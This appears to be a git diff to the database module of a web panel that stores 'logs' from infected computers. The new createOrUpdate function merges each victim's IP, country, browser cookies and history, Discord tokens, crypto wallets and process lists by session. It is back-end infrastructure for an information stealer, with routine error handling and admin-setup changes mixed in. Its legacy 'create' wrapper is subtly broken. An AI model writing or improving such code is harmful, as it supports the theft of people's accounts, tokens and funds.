@@ -3,10 +3,22 @@ const path = require('path');
 const bcrypt = require('bcrypt');
 
 const DB_PATH = path.join(__dirname, 'webpanel.db');
-const db = new Database(DB_PATH);
+
+let db;
+try {
+    db = new Database(DB_PATH);
+    console.log(`Database opened: ${DB_PATH}`);
+} catch (error) {
+    console.error('Failed to open database:', error);
+    throw error;
+}
 
 // Enable foreign keys
-db.pragma('foreign_keys = ON');
+try {
+    db.pragma('foreign_keys = ON');
+} catch (error) {
+    console.error('Failed to enable foreign keys:', error);
+}
 
 // Initialize database schema
 const initDatabase = () => {
@@ -38,14 +50,37 @@ const initDatabase = () => {
     db.exec(`
         CREATE TABLE IF NOT EXISTS logs (
             id TEXT PRIMARY KEY,
+            session_id TEXT,
             ip TEXT,
             country TEXT,
             date DATETIME,
             data_summary TEXT,
             pc_data TEXT,
-            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
+            created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
+            updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
         )
     `);
+    
+    // Create index for session_id for faster lookups
+    db.exec(`
+        CREATE INDEX IF NOT EXISTS idx_logs_session_id ON logs(session_id);
+    `);
+    
+    // Migrate existing database: add session_id and updated_at columns if they don't exist
+    try {
+        db.prepare('SELECT session_id FROM logs LIMIT 1').get();
+    } catch (error) {
+        // Columns don't exist, add them
+        console.log('Migrating database schema: adding session_id and updated_at columns...');
+        try {
+            db.exec('ALTER TABLE logs ADD COLUMN session_id TEXT');
+            db.exec('ALTER TABLE logs ADD COLUMN updated_at DATETIME DEFAULT CURRENT_TIMESTAMP');
+            db.exec('CREATE INDEX IF NOT EXISTS idx_logs_session_id ON logs(session_id)');
+            console.log('Database migration completed successfully');
+        } catch (migrationError) {
+            console.error('Database migration error (columns may already exist):', migrationError.message);
+        }
+    }
 
     // Create indexes for better performance
     db.exec(`
@@ -55,11 +90,21 @@ const initDatabase = () => {
         CREATE INDEX IF NOT EXISTS idx_login_attempts_attempted_at ON login_attempts(attempted_at);
     `);
 
-    // Initialize default admin user if no users exist
+    // Initialize default admin user if no users exist (only from environment variables)
     const userCount = db.prepare('SELECT COUNT(*) as count FROM users').get();
     if (userCount.count === 0) {
-        const defaultUsername = process.env.DEFAULT_ADMIN_USERNAME || 'admin';
-        const defaultPassword = process.env.DEFAULT_ADMIN_PASSWORD || 'admin';
+        const defaultUsername = process.env.DEFAULT_ADMIN_USERNAME;
+        const defaultPassword = process.env.DEFAULT_ADMIN_PASSWORD;
+        
+        if (!defaultUsername || !defaultPassword) {
+            console.warn('⚠️  WARNING: No users exist and DEFAULT_ADMIN_USERNAME/DEFAULT_ADMIN_PASSWORD not set in .env');
+            console.warn('   Please set these environment variables to create the initial admin user.');
+            console.warn('   Or use the database management script: node manage-db.js create-user <username> <password>');
+            return;
+        }
+        
+        // Hash password with bcrypt (includes automatic salting)
+        // bcrypt automatically generates a unique salt for each password
         const passwordHash = bcrypt.hashSync(defaultPassword, 10);
         
         db.prepare(`
@@ -67,8 +112,8 @@ const initDatabase = () => {
             VALUES (?, ?)
         `).run(defaultUsername, passwordHash);
         
-        console.log(`Default admin user created. Username: ${defaultUsername}, Password: ${defaultPassword}`);
-        console.log('⚠️  IMPORTANT: Change the default password in production!');
+        console.log(`Default admin user created from environment variables. Username: ${defaultUsername}`);
+        console.log('⚠️  IMPORTANT: Change the default password immediately after first login!');
     }
 
     console.log('Database initialized successfully');
@@ -145,19 +190,85 @@ const loginAttemptsDb = {
 
 // Logs operations
 const logsDb = {
+    createOrUpdate: (logData) => {
+        const { id, sessionId, ip, country, date, dataSummary, pcData } = logData;
+        
+        // Check if log exists by session_id
+        let existingLog = null;
+        if (sessionId) {
+            existingLog = db.prepare('SELECT * FROM logs WHERE session_id = ?').get(sessionId);
+        }
+        
+        if (existingLog) {
+            // Merge with existing log
+            const existingPcData = JSON.parse(existingLog.pc_data || '{}');
+            const existingDataSummary = JSON.parse(existingLog.data_summary || '{}');
+            
+            // Merge pcData (keep existing values, update with new non-null/non-empty values)
+            const mergedPcData = {
+                ...existingPcData,
+                // Override with new values if provided (non-null/non-empty)
+                screenSize: pcData.screenSize || existingPcData.screenSize,
+                dateTime: pcData.dateTime || existingPcData.dateTime,
+                ipAddress: pcData.ipAddress || existingPcData.ipAddress,
+                location: pcData.location || existingPcData.location,
+                systemInfo: pcData.systemInfo || existingPcData.systemInfo,
+                browserCookies: pcData.browserCookies || existingPcData.browserCookies,
+                // For arrays/lists, use new data if it exists and is non-empty, otherwise keep existing
+                runningProcesses: (pcData.runningProcesses && pcData.runningProcesses.length > 0) 
+                    ? pcData.runningProcesses 
+                    : (existingPcData.runningProcesses || []),
+                installedApps: (pcData.installedApps && pcData.installedApps.length > 0) 
+                    ? pcData.installedApps 
+                    : (existingPcData.installedApps || []),
+                browserHistory: pcData.browserHistory || existingPcData.browserHistory,
+                discordTokens: pcData.discordTokens || existingPcData.discordTokens,
+                cryptoWallets: pcData.cryptoWallets || existingPcData.cryptoWallets,
+                cryptoWalletFolders: pcData.cryptoWalletFolders || existingPcData.cryptoWalletFolders
+            };
+            
+            // Merge dataSummary
+            const mergedDataSummary = {
+                ...existingDataSummary,
+                ...dataSummary
+            };
+            
+            // Update the log
+            db.prepare(`
+                UPDATE logs 
+                SET ip = ?, country = ?, date = ?, data_summary = ?, pc_data = ?, updated_at = CURRENT_TIMESTAMP
+                WHERE session_id = ?
+            `).run(
+                ip || existingLog.ip,
+                country || existingLog.country,
+                date || existingLog.date,
+                JSON.stringify(mergedDataSummary),
+                JSON.stringify(mergedPcData),
+                sessionId
+            );
+            
+            return existingLog.id;
+        } else {
+            // Create new log
+            db.prepare(`
+                INSERT INTO logs (id, session_id, ip, country, date, data_summary, pc_data)
+                VALUES (?, ?, ?, ?, ?, ?, ?)
+            `).run(
+                id,
+                sessionId,
+                ip,
+                country,
+                date,
+                JSON.stringify(dataSummary),
+                JSON.stringify(pcData)
+            );
+            return id;
+        }
+    },
+    
     create: (logData) => {
-        const { id, ip, country, date, dataSummary, pcData } = logData;
-        db.prepare(`
-            INSERT INTO logs (id, ip, country, date, data_summary, pc_data)
-            VALUES (?, ?, ?, ?, ?, ?)
-        `).run(
-            id,
-            ip,
-            country,
-            date,
-            JSON.stringify(dataSummary),
-            JSON.stringify(pcData)
-        );
+        // Legacy method for backward compatibility
+        return this.createOrUpdate(logData);
     },
     
     getAll: () => {
@@ -223,7 +334,13 @@ const logsDb = {
 };
 
 // Initialize database on module load
-initDatabase();
+try {
+    initDatabase();
+} catch (error) {
+    console.error('Failed to initialize database:', error);
+    console.error('Stack trace:', error.stack);
+    process.exit(1);
+}
 
 module.exports = {
     db,
